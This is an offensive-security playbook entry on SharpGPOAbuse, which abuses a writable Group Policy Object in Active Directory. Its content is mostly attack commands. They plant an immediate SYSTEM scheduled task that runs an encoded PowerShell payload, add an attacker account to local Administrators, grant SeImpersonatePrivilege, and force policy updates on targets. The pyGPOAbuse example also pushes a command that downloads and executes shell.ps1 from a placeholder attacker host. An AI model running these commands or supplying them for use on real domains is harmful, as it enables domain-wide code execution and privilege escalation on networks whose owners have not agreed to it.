# 03.32 SharpGPOAbuse

> C# tool that modifies a GPO you have write access to — abuse the modified GPO to push commands SYSTEM-wide.

## Overview

SharpGPOAbuse modifies an attacker-writable Group Policy Object to add: a new immediate scheduled task that runs as SYSTEM, or a new user rights assignment that gives a target user SeImpersonatePrivilege/SeBackupPrivilege, or a new logon script. Requires write access to the GPO (verify with PowerView's Get-DomainObjectAcl). Once applied via gpupdate /force, the affected OU's hosts execute the malicious task.

## Steps

- **Step 1** - Identify GPO you can write to (PowerView/BloodHound).
- **Step 2** - Identify GPO scope (which OUs/computers).
- **Step 3** - Modify GPO with SharpGPOAbuse.
- **Step 4** - Wait for `gpupdate` cycle (~90 min default) or force gpupdate on a target.
- **Step 5** - Cleanup the GPO after exploitation.

## Commands

### Get binary

```powershell
iwr 'https://github.com/FSecureLABS/SharpGPOAbuse/releases/latest/download/SharpGPOAbuse.exe' -OutFile SharpGPOAbuse.exe
```

### Add immediate scheduled task

```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName 'Updater' --Author 'NT AUTHORITY\SYSTEM' --Command 'cmd.exe' --Arguments '/c powershell -enc <B64-PAYLOAD>' --GPOName 'Default Domain Policy'
```

### Add user rights to local Administrators

```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <ATTACKER-USER> --GPOName 'Default Domain Policy'
```

### Grant SeImpersonatePrivilege

```powershell
SharpGPOAbuse.exe --AddUserRights --UserRights SeImpersonatePrivilege --UserAccount <ATTACKER-USER> --GPOName 'Default Domain Policy'
```

### Force gpupdate on a target

```cmd
REM From the target host
gpupdate /force
REM Or remotely:
Invoke-Command -ComputerName <TARGET> -ScriptBlock {gpupdate /force}
```

### pyGPOAbuse — Linux equivalent

```bash
git clone https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse
python3 pygpoabuse.py <DOMAIN>/<USER>:<PASS> -gpo-id <GPO-ID> --powershell --command 'IEX(New-Object Net.WebClient).DownloadString("http://<ATTACKER>/shell.ps1")'
```
